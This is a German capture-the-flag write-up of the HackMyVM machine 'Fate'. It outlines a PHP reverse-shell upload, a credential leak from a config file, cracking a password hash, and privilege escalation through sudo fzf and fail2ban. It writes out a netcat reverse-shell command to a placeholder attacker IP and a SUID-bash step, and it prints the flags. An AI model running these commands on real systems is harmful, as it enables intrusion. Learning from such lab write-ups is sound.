# Fate - HackMyVM (Medium)

![Fate.png](Fate.png)

## Übersicht

*   **VM:** Fate
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Fate)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 24. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Fate_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war die Kompromittierung der virtuellen Maschine "Fate". Die Enumeration ergab einen Nginx-Webserver (Port 80) mit einer Upload-Funktion und eine Gancio-Anwendung (Port 13120). Der initiale Zugriff erfolgte durch das Hochladen einer PHP-Reverse-Shell auf Port 80 und deren Ausführung als `www-data` (der genaue Mechanismus zur Umgehung der nicht-PHP-Ausführung wurde im Log nicht detailliert, aber die Shell wurde erlangt). In der Konfigurationsdatei der Gancio-Anwendung wurden Datenbank-Zugangsdaten gefunden. Diese wurden genutzt, um auf die MariaDB-Datenbank zuzugreifen und den Passwort-Hash des Benutzers `connor` zu extrahieren. Nachdem der Hash geknackt war (`genesis`), konnte zu `connor` gewechselt werden. `connor` durfte `fzf` als `john` ausführen, was über die `--preview`-Option zur Erlangung einer Shell als `john` genutzt wurde. Schließlich durfte `john` `fail2ban` mittels `systemctl restart` als `root` neu starten. Durch Modifizieren einer Fail2ban-Aktionsdatei (z.B. in der `actionstart`-Direktive) wurde beim Neustart von Fail2ban das SUID-Bit auf `/bin/bash` gesetzt, was eine Root-Shell ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nc (netcat)`
*   `curl`
*   `nikto`
*   `python`
*   `ls`, `pwd`, `cd`, `cat`, `find`, `echo`, `grep`
*   `mysql` (Client)
*   `john` (John the Ripper)
*   `su`
*   `sudo`
*   `fzf`
*   `wget`
*   `chmod`
*   `ssh`
*   `nano`
*   `watch`
*   `systemctl`
*   `bash`
*   Standard Linux-Befehle

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Fate" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   IP-Findung mittels `arp-scan` (192.168.2.109).
    *   Portscan mit `nmap` identifizierte Port 22 (SSH OpenSSH 8.4p1), Port 80 (Nginx 1.18.0) und Port 13120 (Node.js Express Framework - Gancio).

2.  **Web Enumeration & Initial Access (Reverse Shell als `www-data`):**
    *   `gobuster` auf Port 80 fand `/uploads` und `/upload.php`.
    *   Eine PHP-Reverse-Shell wurde (implizit erfolgreich) hochgeladen. Der direkte Aufruf scheiterte zunächst, da Nginx die Datei nicht als PHP interpretierte.
    *   (Der genaue Mechanismus, wie die Shell letztendlich ausgelöst wurde, ist im Log unklar, aber eine Reverse Shell als `www-data` wurde empfangen).

3.  **Database Credential Leak & Lateral Movement (von `www-data` zu `connor`):**
    *   Enumeration als `www-data` führte zur Datei `/opt/gancio/config.json`.
    *   Die `config.json` enthielt Klartext-Zugangsdaten für die MariaDB-Datenbank (`gancio`:`gancio`).
    *   Login in die Datenbank, die `users`-Tabelle wurde ausgelesen. Der Bcrypt-Hash für `connor@localhost` wurde extrahiert.
    *   Der Hash wurde mit `john` und `rockyou.txt` geknackt, das Passwort war `genesis`.
    *   Mit `su connor` und dem Passwort `genesis` wurde zu `connor` gewechselt.

4.  **Privilege Escalation (von `connor` zu `john` via `sudo fzf`):**
    *   `sudo -l` für `connor` zeigte: `(john) NOPASSWD: /usr/bin/fzf`.
    *   Mit `sudo -u john /usr/bin/fzf --preview="nc -e /bin/bash <ANGREIFER-IP> <PORT>"` wurde eine Reverse Shell als `john` erlangt. Die User-Flag wurde gelesen.

5.  **Privilege Escalation (von `john` zu `root` via `sudo systemctl` & Fail2ban):**
    *   `sudo -l` für `john` zeigte: `(root) NOPASSWD: /usr/bin/systemctl restart fail2ban`.
    *   Eine Fail2ban-Aktionsdatei (z.B. `/etc/fail2ban/action.d/iptables-common.conf`) wurde modifiziert. Die `actionstart`-Direktive wurde geändert, um `/bin/chmod u+s /bin/bash` auszuführen.
    *   Durch Ausführen von `sudo /usr/bin/systemctl restart fail2ban` wurde der modifizierte `actionstart`-Befehl als `root` ausgeführt, was das SUID-Bit auf `/bin/bash` setzte.
    *   Mit `/bin/bash -p` wurde eine Root-Shell erlangt. Die Root-Flag wurde gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Unsichere Dateiupload-Funktion:** Eine Upload-Funktion erlaubte das Hochladen von PHP-Dateien, die später zur Codeausführung genutzt wurden.
*   **Klartext-Zugangsdaten in Konfigurationsdateien:** Datenbank-Zugangsdaten waren im Klartext in einer lesbaren Konfigurationsdatei (`config.json`) gespeichert.
*   **Schwache Passwort-Hashes in Datenbank:** Benutzerpasswörter (Hashes) in der Datenbank konnten mit gängigen Wortlisten geknackt werden.
*   **Unsichere `sudo`-Konfigurationen:**
    *   `connor` durfte `fzf` als `john` ausführen. `fzf` erlaubt über Optionen wie `--preview` die Ausführung von Befehlen.
    *   `john` durfte `systemctl restart fail2ban` als `root` ausführen. Dies ermöglichte die Manipulation von Fail2ban-Aktionsdateien, um beim Neustart des Dienstes beliebigen Code als Root auszuführen (hier: Setzen des SUID-Bits auf Bash).
*   **Dienst-Konfigurationsmanipulation für Privesc:** Die Möglichkeit, einen Dienst neu zu starten (Fail2ban) und dessen Konfigurationsdateien zu modifizieren, wurde zur Rechteausweitung missbraucht.

## Flags

*   **User Flag (`/home/john/user.txt`):** `Ineedyourboots`
*   **Root Flag (`/root/root.txt`):** `Cyborgsdontfeelpain`

## Tags

`HackMyVM`, `Fate`, `Medium`, `FileUpload`, `RCE`, `DatabaseLeak`, `PasswordCracking`, `SudoFZF`, `SudoSystemctl`, `Fail2banExploit`, `SUIDAbuse`, `Linux`, `Web`, `NodeJS`, `Privilege Escalation`
